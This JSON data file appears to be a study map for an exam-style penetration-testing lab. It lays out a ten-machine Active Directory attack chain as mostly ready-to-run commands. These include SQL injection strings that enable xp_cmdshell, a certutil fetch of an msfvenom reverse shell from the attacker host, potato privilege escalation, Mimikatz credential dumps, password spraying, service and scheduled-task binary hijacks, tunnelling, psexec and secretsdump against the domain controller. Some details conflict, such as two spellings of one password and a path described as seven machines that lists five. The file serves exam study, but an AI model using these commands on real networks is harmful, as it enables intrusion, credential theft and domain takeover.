@@ -1,0 +1,627 @@
+{
+  "id": "sqli-to-domain-dominance",
+  "title": "SQLi to Domain Dominance",
+  "category": "ad-chain",
+  "source": ["Medtech"],
+  "designed_by": "lab-derived",
+  "description": "Large AD lab: 10 machines across 2 networks. SQLi on WEB02 → xp_cmdshell → PrintSpoofer/GodPotato/SweetPotato → Mimikatz (joe:Flowers1) → credential spray → fileMonitorBackup.log (wario/yoshi:Mushroom!) → service hijack / backup.exe hijack → leon:rabbit:) domain admin → psexec sweep → DC credentials.txt (offsec) → full domain dominance.",
+  "introduction": "Teaches SQLi-to-RCE via xp_cmdshell and credential chaining across many hosts. Exam-relevant: one web vuln can unlock an entire domain through password reuse and file mining.",
+  "mental_model": "SQLi is your entry; xp_cmdshell is your RCE. Every file and log may contain creds—grep for NTLM, passwords, and usernames. Spray discovered creds broadly; one hit unlocks the next machine.",
+  "key_principles": [
+    "Enable xp_cmdshell via SQLi; use certutil to fetch and run reverse shell",
+    "Mimikatz sekurlsa::logonpasswords extracts logged-on user creds",
+    "Mine config files and logs for NTLM hashes; crack with hashcat",
+    "Service/scheduled task hijack: replace writable binary, restart service",
+    "Check DC desktop and shared folders for credentials.txt before giving up"
+  ],
+
+  "indicators": {
+    "difficulty": 6,
+    "cognitive_load": 6,
+    "enumeration_depth": 4,
+    "rabbit_hole_risk": 4,
+    "time_pressure": 7
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004", "TA0006", "TA0007", "TA0008"],
+    "techniques": [
+      {"id": "T1190", "name": "Exploit Public-Facing Application"},
+      {"id": "T1059", "name": "Command and Scripting Interpreter"},
+      {"id": "T1134.001", "name": "Token Impersonation/Theft"},
+      {"id": "T1574.010", "name": "Services File Permissions Weakness"},
+      {"id": "T1053.005", "name": "Scheduled Task/Cron"},
+      {"id": "T1003.001", "name": "LSASS Memory"},
+      {"id": "T1552.001", "name": "Credentials In Files"},
+      {"id": "T1110.002", "name": "Brute Force: Password Cracking"},
+      {"id": "T1110.003", "name": "Brute Force: Password Spraying"},
+      {"id": "T1548.003", "name": "Sudo and Sudo Caching"},
+      {"id": "T1569.002", "name": "Service Execution: PsExec"},
+      {"id": "T1021.006", "name": "Windows Remote Management"},
+      {"id": "T1021.001", "name": "Remote Desktop Protocol"},
+      {"id": "T1021.004", "name": "SSH"},
+      {"id": "T1572", "name": "Protocol Tunneling"},
+      {"id": "T1003.006", "name": "DCSync"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T2-Web-Access", "T3-NonWeb-Access", "T4a-Linux-PrivEsc", "T4b-Win-PrivEsc", "T5-Credentials", "T6-Pivoting", "T7-Lateral", "T8-Domain-Dominance"],
+
+  "environment": {
+    "machine_count": 10,
+    "network_count": 2,
+    "os_distribution": {"windows": 8, "linux": 2},
+    "has_ad": true,
+    "has_pivoting": true,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "sqli", "xp_cmdshell", "mimikatz", "service-hijack", "credential-spray", "psexec",
+    "ligolo-ng", "openvpn-gtfobins", "printspoofer", "godpotato", "sweetpotato",
+    "evil-winrm", "xfreerdp", "ssh", "nxc", "crackmapexec", "hashcat",
+    "impacket-psexec", "impacket-secretsdump", "fileMonitorBackup", "hole.txt",
+    "backup.exe", "auditTracker", "certutil", "msfvenom", "proxychains",
+    "frp", "chisel", "iox"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": true,
+    "pen200_modules": [6, 8, 10, 13, 16, 17, 18, 19, 24],
+    "pattern_frequency": "high",
+    "recommended_order": 2
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "192.168.x.0/24", "label": "External"},
+    {"id": "internal", "cidr": "172.16.x.0/24", "label": "AD Internal"}
+  ],
+
+  "machines": [
+    {
+      "id": "web02",
+      "label": "WEB02",
+      "ip": "192.168.x.121",
+      "os": "Windows",
+      "role": "AD Entry / Pivot (dual-NIC)",
+      "networks": ["external", "internal"],
+      "services": [
+        {
+          "port": 80,
+          "name": "HTTP (IIS)",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "sqli", "summary": "SQL injection in username field (login page)", "leads_to": "xp_cmdshell-rce"}
+          ],
+          "commands": [
+            "dirsearch -u http://192.168.x.121 -e php,asp,aspx",
+            "gobuster dir -u http://192.168.x.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
+          ]
+        },
+        {
+          "port": 1433,
+          "name": "MSSQL",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "sqli-rce", "summary": "SQLi → xp_cmdshell → RCE", "leads_to": "mssql-service-account"}
+          ],
+          "commands": [
+            "admin';EXEC sp_configure 'show advanced options',1; --",
+            "admin';EXEC sp_configure RECONFIGURE; --",
+            "admin';EXEC sp_configure 'xp_cmdshell',1; --",
+            "admin';EXEC sp_configure RECONFIGURE; --",
+            "admin';EXEC xp_cmdshell 'whoami'; --",
+            {"cmd": "admin';EXEC xp_cmdshell 'certutil -urlcache -split -f http://<kali-ip>:80/r80.exe c:\\windows\\temp\\r80.exe'; --", "rationale": "Why: Fetch reverse shell via SQLi RCE to get interactive access"},
+            "admin';EXEC xp_cmdshell 'c:\\windows\\temp\\r80.exe'; --",
+            "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali-ip> LPORT=80 -f exe -o r80.exe",
+            "python3 -m http.server 80"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "mssql service account (nt service\\mssql$sqlexpress)",
+          "to": "SYSTEM",
+          "technique": "SeImpersonatePrivilege → PrintSpoofer / GodPotato / SweetPotato",
+          "commands": [
+            "whoami /priv",
+            {"cmd": "PrintSpoofer64.exe -i -c cmd", "rationale": "Why: SeImpersonate to SYSTEM for Mimikatz credential dump"},
+            "GodPotato64.exe -cmd \"cmd /c whoami\"",
+            "SweetPotato.exe -e EfsRpc -p C:\\windows\\temp\\rev.exe"
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "joe", "type": "password", "value": "Flowers1", "source": "Mimikatz sekurlsa::logonpasswords", "unlocks": ["files02"]}
+      ],
+      "alternatives": [
+        {"source": "W5", "description": "sqlmap automation: sqlmap -r request.txt --batch --os-shell"},
+        {"source": "W6", "description": "PowerShell base64 reverse shell via xp_cmdshell instead of certutil+exe"},
+        {"source": "W3,W6", "description": "GodPotato instead of PrintSpoofer"},
+        {"source": "W7", "description": "SweetPotato instead of PrintSpoofer"},
+        {"source": "W5", "description": "Metasploit getsystem"}
+      ]
+    },
+    {
+      "id": "files02",
+      "label": "FILES02",
+      "ip": "172.16.x.11",
+      "os": "Windows",
+      "role": "AD Member",
+      "networks": ["internal"],
+      "services": [
+        {
+          "port": 445,
+          "name": "SMB",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "SMB with joe:Flowers1 (from spray)", "leads_to": "local-user"}
+          ],
+          "commands": [
+            "proxychains -q crackmapexec smb 172.16.x.11 -u joe -p 'Flowers1'",
+            "proxychains -q nxc smb 172.16.x.11 -u joe -p 'Flowers1'"
+          ]
+        },
+        {
+          "port": 5985,
+          "name": "WinRM",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "Evil-WinRM with joe:Flowers1", "leads_to": "local-user"}
+          ],
+          "commands": [
+            "proxychains -q evil-winrm -i 172.16.x.11 -u joe -p 'Flowers1'",
+            "proxychains -q nxc winrm 172.16.x.11 -u joe -p 'Flowers1'"
+          ]
+        }
+      ],
+      "privesc": [],
+      "credentials": [
+        {"user": "wario", "type": "password", "value": "Mushroom!", "source": "fileMonitorBackup.log NTLM extraction + hashcat -m 1000", "unlocks": ["client02"]},
+        {"user": "yoshi", "type": "password", "value": "Mushroom!", "source": "fileMonitorBackup.log NTLM extraction + hashcat", "unlocks": ["client01", "dev04"]}
+      ],
+      "alternatives": [
+        {"source": "W1-W7", "description": "fileMonitorBackup.log in joe's Documents contains NTLM hashes for wario, yoshi, daisy, toad, goomba", "commands": ["type c:\\users\\joe\\documents\\fileMonitorBackup.log", "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt"]},
+        {"source": "W6", "description": "cat fileMonitorBackup.log | dos2unix | grep NTLM"}
+      ]
+    },
+    {
+      "id": "client02",
+      "label": "CLIENT02",
+      "ip": "172.16.x.83",
+      "os": "Windows",
+      "role": "AD Member",
+      "networks": ["internal"],
+      "services": [
+        {
+          "port": 5985,
+          "name": "WinRM",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "Evil-WinRM with wario:Mushroom!", "leads_to": "local-user"}
+          ],
+          "commands": [
+            "proxychains -q evil-winrm -i 172.16.x.83 -u wario -p 'Mushroom!'"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "wario",
+          "to": "SYSTEM",
+          "technique": "auditTracker service binary hijack — writable path, replace with reverse shell",
+          "commands": [
+            "sc qc auditTracker",
+            "icacls \"C:\\path\\to\\auditTracker\"",
+            "copy C:\\path\\to\\auditTracker.exe C:\\path\\to\\auditTracker.exe.bak",
+            "copy rev.exe C:\\path\\to\\auditTracker.exe",
+            "sc stop auditTracker",
+            "sc start auditTracker"
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "wario", "type": "password", "value": "Mushroom!", "source": "fileMonitorBackup.log", "unlocks": []}
+      ],
+      "alternatives": [
+        {"source": "W2,W3,W6,W7", "description": "Service binary hijack on auditTracker"}
+      ]
+    },
+    {
+      "id": "client01",
+      "label": "CLIENT01",
+      "ip": "172.16.x.82",
+      "os": "Windows",
+      "role": "AD Member",
+      "networks": ["internal"],
+      "services": [
+        {
+          "port": 445,
+          "name": "SMB",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "psexec with yoshi:Mushroom!", "leads_to": "local-admin"}
+          ],
+          "commands": [
+            "proxychains -q impacket-psexec medtech/yoshi:'Mushroom!'@172.16.x.82",
+            "proxychains -q crackmapexec smb 172.16.x.82 -u yoshi -p 'Mushroom!'"
+          ]
+        }
+      ],
+      "privesc": [],
+      "credentials": [
+        {"user": "leon", "type": "password", "value": "rabbit:)", "source": "hole.txt on CLIENT01 (note: hole.txt has decoy 'leon/rabbit!:)', real is rabbit:))", "unlocks": ["prod01", "dc01"]}
+      ],
+      "alternatives": [
+        {"source": "W2,W4,W6,W7", "description": "hole.txt credential file — W6/W7: hole.txt has '!' appended as decoy, real password is rabbit:)"}
+      ]
+    },
+    {
+      "id": "dev04",
+      "label": "DEV04",
+      "ip": "172.16.x.12",
+      "os": "Windows",
+      "role": "AD Member",
+      "networks": ["internal"],
+      "services": [
+        {
+          "port": 3389,
+          "name": "RDP",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "RDP with yoshi:Mushroom!", "leads_to": "local-user"}
+          ],
+          "commands": [
+            "proxychains -q xfreerdp /v:172.16.x.12 /u:yoshi /p:'Mushroom!' /d:medtech",
+            "proxychains -q hydra -l yoshi -p 'Mushroom!' -M rdp_targets.txt rdp -I",
+            "proxychains -q nxc rdp 172.16.x.12 -u yoshi -p 'Mushroom!'"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "yoshi",
+          "to": "SYSTEM",
+          "technique": "Scheduled task / backup.exe hijack — writable binary path, replace with reverse shell",
+          "commands": [
+            "schtasks /query /fo LIST /v",
+            "icacls C:\\path\\to\\backup.exe",
+            "copy C:\\path\\to\\backup.exe C:\\path\\to\\backup.exe.bak",
+            "copy rev.exe C:\\path\\to\\backup.exe",
+            "schtasks /run /tn \"BackupTask\""
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "leon", "type": "password", "value": "rabbit:))", "source": "Mimikatz sekurlsa::logonpasswords after backup.exe hijack privesc", "unlocks": ["prod01", "dc01"]}
+      ],
+      "alternatives": [
+        {"source": "W2-W7", "description": "backup.exe scheduled task hijack — confirmed by 6/7 walkthroughs"},
+        {"source": "W6", "description": "Omitting -d domain from xfreerdp can bypass NLA/CredSSP issues"},
+        {"source": "W6", "description": "leon got locked out from aggressive credential fuzzing — spray carefully"}
+      ]
+    },
+    {
+      "id": "prod01",
+      "label": "PROD01",
+      "ip": "172.16.x.13",
+      "os": "Windows",
+      "role": "AD Member (Domain Admin)",
+      "networks": ["internal"],
+      "services": [
+        {
+          "port": 5985,
+          "name": "WinRM",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "Evil-WinRM with leon:rabbit:)) (domain admin)", "leads_to": "domain-admin"}
+          ],
+          "commands": [
+            "proxychains -q evil-winrm -i 172.16.x.13 -u leon -p 'rabbit:))'",
+            "proxychains -q evil-winrm -i 172.16.x.13 -u leon -H '<ntlm_hash>'"
+          ]
+        }
+      ],
+      "privesc": [],
+      "credentials": [],
+      "alternatives": [
+        {"source": "W6", "description": "evil-winrm PTH with leon NTLM hash"}
+      ]
+    },
+    {
+      "id": "dc01",
+      "label": "DC01",
+      "ip": "172.16.x.10",
+      "os": "Windows",
+      "role": "Domain Controller",
+      "networks": ["internal"],
+      "services": [
+        {
+          "port": 445,
+          "name": "SMB",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "psexec with leon:rabbit:)) (domain admin)", "leads_to": "domain-admin"}
+          ],
+          "commands": [
+            "proxychains -q impacket-psexec medtech/leon:'rabbit:))'@172.16.x.10",
+            "proxychains -q impacket-smbexec medtech/leon:'rabbit:))'@172.16.x.10"
+          ]
+        }
+      ],
+      "privesc": [],
+      "credentials": [
+        {"user": "offsec", "type": "password", "value": "century62hisan51", "source": "credentials.txt on Administrator desktop", "unlocks": ["web01"]}
+      ],
+      "alternatives": [
+        {"source": "W6", "description": "secretsdump full domain hash dump (Administrator, krbtgt, offsec, machine accounts)"},
+        {"source": "W6", "description": "impacket-secretsdump medtech/leon:'rabbit:))'@172.16.x.10"}
+      ]
+    },
+    {
+      "id": "web01",
+      "label": "WEB01",
+      "ip": "192.168.x.120",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 22,
+          "name": "SSH",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "SSH with offsec:century62hisan51 (from credentials.txt on DC)", "leads_to": "local-user"}
+          ],
+          "commands": [
+            "ssh offsec@192.168.x.120"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "offsec",
+          "to": "root",
+          "technique": "sudo ALL — trivial sudo misconfiguration",
+          "commands": [
+            "sudo -l",
+            "sudo /bin/bash"
+          ]
+        }
+      ],
+      "credentials": [],
+      "alternatives": [
+        {"source": "W2-W7", "description": "sudo ALL confirmed by 6/7 walkthroughs"}
+      ]
+    },
+    {
+      "id": "vpn",
+      "label": "VPN",
+      "ip": "192.168.x.122",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 22,
+          "name": "SSH",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "SSH brute force offsec:password", "leads_to": "local-user"}
+          ],
+          "commands": [
+            "hydra -l offsec -P /usr/share/wordlists/rockyou.txt -t 10 ssh://192.168.x.122"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "offsec",
+          "to": "root",
+          "technique": "sudo openvpn GTFOBins — script-security 2 + up for arbitrary command execution",
+          "commands": [
+            "sudo -l",
+            "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'"
+          ]
+        }
+      ],
+      "credentials": [
+        {"user": "offsec", "type": "password", "value": "password", "source": "SSH brute force (rockyou)", "unlocks": ["vpn"]},
+        {"user": "mario", "type": "ssh-key", "source": "id_rsa found after root", "unlocks": ["linux01"]}
+      ],
+      "alternatives": [
+        {"source": "W3-W7", "description": "sudo openvpn GTFOBins — 6/7 walkthroughs"},
+        {"source": "W4", "description": "lshell restricted shell escape as alternative"}
+      ]
+    },
+    {
+      "id": "linux01",
+      "label": "LINUX01",
+      "ip": "172.16.x.14",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["internal"],
+      "services": [
+        {
+          "port": 22,
+          "name": "SSH",
+          "version": "",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "SSH with mario id_rsa (from VPN)", "leads_to": "local-user"}
+          ],
+          "commands": [
+            "ssh -i mario_id_rsa mario@172.16.x.14"
+          ]
+        }
+      ],
+      "privesc": [],
+      "credentials": [],
+      "alternatives": [
+        {"source": "W3-W7", "description": "SSH key reuse from VPN root after sudo openvpn privesc"}
+      ]
+    }
+  ],
+
+  "connections": [
+    {
+      "from": "web02",
+      "to": "files02",
+      "technique": "Password spray (evil-winrm / crackmapexec)",
+      "requires": "joe:Flowers1 from Mimikatz on WEB02",
+      "pivot": "Ligolo-ng / frp / chisel / SSH tunnel from WEB02 to 172.16.x.0/24",
+      "path_ids": ["path-main", "path-critical"],
+      "commands": [
+        "agent.exe -connect <kali-ip>:11601 -ignore-cert",
+        "session",
+        "ifconfig",
+        "start --tun ligolo",
+        "ip route add 172.16.x.0/24 dev ligolo",
+        "evil-winrm -i 172.16.x.11 -u joe -p 'Flowers1'"
+      ]
+    },
+    {
+      "from": "files02",
+      "to": "client02",
+      "technique": "Password spray (evil-winrm)",
+      "requires": "wario:Mushroom! from fileMonitorBackup.log NTLM crack",
+      "pivot": "Ligolo tunnel",
+      "path_ids": ["path-main", "path-critical"],
+      "commands": [
+        "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt",
+        "evil-winrm -i 172.16.x.83 -u wario -p 'Mushroom!'"
+      ]
+    },
+    {
+      "from": "files02",
+      "to": "client01",
+      "technique": "Password spray (psexec)",
+      "requires": "yoshi:Mushroom! from fileMonitorBackup.log",
+      "pivot": "Ligolo tunnel",
+      "path_ids": ["path-main", "path-critical"],
+      "commands": [
+        "impacket-psexec medtech/yoshi:'Mushroom!'@172.16.x.82",
+        "type hole.txt"
+      ]
+    },
+    {
+      "from": "files02",
+      "to": "dev04",
+      "technique": "Password spray (RDP)",
+      "requires": "yoshi:Mushroom! from fileMonitorBackup.log",
+      "pivot": "Ligolo tunnel",
+      "path_ids": ["path-main", "path-critical"],
+      "commands": [
+        "xfreerdp /v:172.16.x.12 /u:yoshi /p:'Mushroom!' /d:medtech"
+      ]
+    },
+    {
+      "from": "client01",
+      "to": "prod01",
+      "technique": "Evil-WinRM (leon:rabbit:))",
+      "requires": "leon:rabbit:) from hole.txt",
+      "pivot": "Ligolo tunnel",
+      "path_ids": ["path-main", "path-critical"],
+      "commands": [
+        "evil-winrm -i 172.16.x.13 -u leon -p 'rabbit:))'"
+      ]
+    },
+    {
+      "from": "dev04",
+      "to": "prod01",
+      "technique": "Evil-WinRM (leon:rabbit:))",
+      "requires": "leon:rabbit:)) from Mimikatz on DEV04 after backup.exe hijack",
+      "pivot": "Ligolo tunnel",
+      "path_ids": ["path-main", "path-critical"],
+      "commands": [
+        "mimikatz.exe",
+        "privilege::debug",
+        "sekurlsa::logonpasswords",
+        "evil-winrm -i 172.16.x.13 -u leon -p 'rabbit:))'"
+      ]
+    },
+    {
+      "from": "prod01",
+      "to": "dc01",
+      "technique": "psexec (domain admin)",
+      "requires": "leon:rabbit:)) domain admin",
+      "pivot": "Ligolo tunnel",
+      "path_ids": ["path-main", "path-critical"],
+      "commands": [
+        "impacket-psexec medtech/leon:'rabbit:))'@172.16.x.10",
+        {"cmd": "type C:\\Users\\Administrator\\Desktop\\credentials.txt", "rationale": "Why: DC desktop often holds crown-jewel creds for other hosts"}
+      ]
+    },
+    {
+      "from": "dc01",
+      "to": "web01",
+      "technique": "SSH (offsec:century62hisan51)",
+      "requires": "credentials.txt on DC desktop",
+      "pivot": "Direct (WEB01 on external)",
+      "path_ids": ["path-main", "path-critical"],
+      "commands": [
+        "ssh offsec@192.168.x.120"
+      ]
+    },
+    {
+      "from": "vpn",
+      "to": "linux01",
+      "technique": "SSH key reuse (mario id_rsa)",
+      "requires": "mario SSH key from VPN after root",
+      "pivot": "Ligolo tunnel (VPN on external, LINUX01 on internal)",
+      "path_ids": ["path-vpn-branch"],
+      "commands": [
+        "find / -name id_rsa 2>/dev/null",
+        "cat /home/offsec/.ssh/id_rsa",
+        "ssh -i mario_id_rsa mario@172.16.x.14"
+      ]
+    }
+  ],
+
+  "attack_paths": [
+    {
+      "id": "path-main",
+      "name": "AD: SQLi → Spray → Domain Admin (Primary)",
+      "color": "#6bb8cc",
+      "steps": ["web02", "files02", "dev04", "dc01", "web01"],
+      "description": "SQLi → xp_cmdshell → PrintSpoofer → Mimikatz (joe) → spray → fileMonitorBackup.log (wario/yoshi) → .12 RDP → backup.exe hijack → Mimikatz (leon) → evil-winrm PROD01 → psexec DC → credentials.txt → .120 SSH"
+    },
+    {
+      "id": "path-critical",
+      "name": "AD: Minimum Steps (Critical Path)",
+      "color": "#e8a87c",
+      "steps": ["web02", "files02", "dev04", "dc01", "web01"],
+      "description": "7 machines: .121 → .11 → .12 → .10 → .120. Touch .82 for hole.txt OR get leon from .12 Mimikatz."
+    },
+    {
+      "id": "path-client02",
+      "name": "AD: CLIENT02 via wario (Service Hijack)",
+      "color": "#85e89d",
+      "steps": ["web02", "files02", "client02"],
+      "description": "SQLi → joe → fileMonitorBackup.log → wario:Mushroom! → .83 evil-winrm → auditTracker service hijack → SYSTEM → Mimikatz"
+    },
+    {
+      "id": "path-client01",
+      "name": "AD: CLIENT01 via hole.txt",
+      "color": "#d2a8ff",
+      "steps": ["web02", "files02", "client01"],
+      "description": "SQLi → joe → fileMonitorBackup.log → yoshi:Mushroom! → .82 psexec → hole.txt (leon:rabbit:)) → PROD01 → DC"
+    },
+    {
+      "id": "path-vpn-branch",
+      "name": "Standalone: VPN → LINUX01",
+      "color": "#f0e68c",
+      "steps": ["vpn", "linux01"],
+      "description": "SSH brute offsec:password → sudo openvpn GTFOBins → root → mario id_rsa → .14 LINUX01"
+    },
+    {
+      "id": "path-secretsdump",
+      "name": "AD: Full Domain Dump (W6)",
+      "color": "#87ceeb",
+      "steps": ["web02", "files02", "dev04", "dc01"],
+      "description": "leon → psexec DC → impacket-secretsdump for full domain hash dump (Administrator, krbtgt, all machine accounts)"
+    }
+  ]
+}
